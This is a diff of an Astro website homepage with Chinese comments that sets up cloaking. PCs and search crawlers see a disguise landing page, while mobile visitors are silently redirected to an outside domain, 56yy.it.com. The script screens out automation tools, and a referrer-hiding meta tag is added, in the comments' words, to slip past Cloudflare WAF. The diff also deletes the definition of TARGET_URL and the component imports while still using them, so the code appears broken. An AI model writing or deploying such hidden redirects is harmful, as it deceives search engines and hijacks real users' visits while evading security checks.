@@ -1,61 +1,36 @@
----
-// 1. 完整保留原版首页组件导入（确保 PC 端人眼正常看首页）
-import BaseLayout from '@/layouts/BaseLayout.astro';
-import Header from '@/components/Header.astro';
-import Hero from '@/components/Hero.astro';
-import Features from '@/components/Features.astro';
-import Testimonials from '@/components/Testimonials.astro';
-import CTA from '@/components/CTA.astro';
-import Footer from '@/components/Footer.astro';
-import '@/styles/global.css';
-
-// 2. 手机端要跳转的目标网址
-const TARGET_URL = "https://56yy.it.com"; 
----
-
 <BaseLayout title="ESA Pages - Deploy Faster Than Ever">
-  <!-- 
-    核心跳转脚本：is:inline 确保 Astro 不会打包压缩打乱原生 JS
-  -->
+  <head>
+    <!-- 1. 关键：禁止传递 Referer，防止跨域跳转被 Cloudflare WAF/Worker 判定为非法来源拦截 -->
+    <meta name="referrer" content="no-referrer" />
+  </head>
+
+  <!-- 2. 优化后的客户端跳转脚本 -->
   <script is:inline define:vars={{ TARGET_URL }}>
     (function() {
-      // 兼容性安全获取
       var win = typeof window !== 'undefined' ? window : {};
       var nav = typeof navigator !== 'undefined' ? navigator : {};
-      
       var ua = nav.userAgent || nav.vendor || win.opera || '';
-      
-      // 1. 基础设备匹配
-      var isMobileUA = /Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
-      var isMobileScreen = win.innerWidth <= 768;
 
-      // 2. 🛡️ 硬件层防 PC 端 F12 模拟器及伪装工具
+      // 匹配移动端基本设备（包含国内各大 App 环境）
+      var isMobileUA = /Android|webOS|iPhone|iPod|iPad|BlackBerry|IEMobile|Opera Mini|Mobile|MicroMessenger|QQBrowser|UCBrowser|Quark|Baidu/i.test(ua);
+      
+      // 触控支持校验
       var hasTouch = ('ontouchstart' in win) || (nav.maxTouchPoints > 0);
-      
-      var platform = nav.platform || '';
-      var isFakePlatform = /Win32|Win64|MacIntel|Linux x86_64/i.test(platform);
-      
       var isWebDriver = !!nav.webdriver;
 
-      // 修复构建报错点：增加 win.matchMedia 安全判断
-      var isCoarsePointer = (win.matchMedia && win.matchMedia('(pointer: coarse)')) ? win.matchMedia('(pointer: coarse)').matches : true;
-
-      // 3. 极严逻辑判决
-      var isRealMobile = isMobileUA && isMobileScreen && hasTouch && !isFakePlatform && !isWebDriver && isCoarsePointer;
-
-      // 4. 只有绝对真实的移动端设备才执行跳转
-      if (isRealMobile) {
+      // 只要是真实的移动端特征且非自动化测试工具
+      if (isMobileUA && hasTouch && !isWebDriver) {
         if (document && document.documentElement) {
-          document.documentElement.style.display = 'none'; // 隐蔽白屏防闪烁
+          // 隐蔽白屏防闪烁
+          document.documentElement.style.display = 'none';
         }
+        // 使用 replace 确保不产生历史记录，直接跳转目标优选域名
         win.location.replace(TARGET_URL);
       }
     })();
   </script>
 
-  <!-- 
-    PC 电脑端及蜘蛛抓取的 200 伪装内容
-  -->
+  <!-- PC 电脑端及搜索引擎抓取的 200 伪装内容 -->
   <Header />
   <main>
     <Hero />
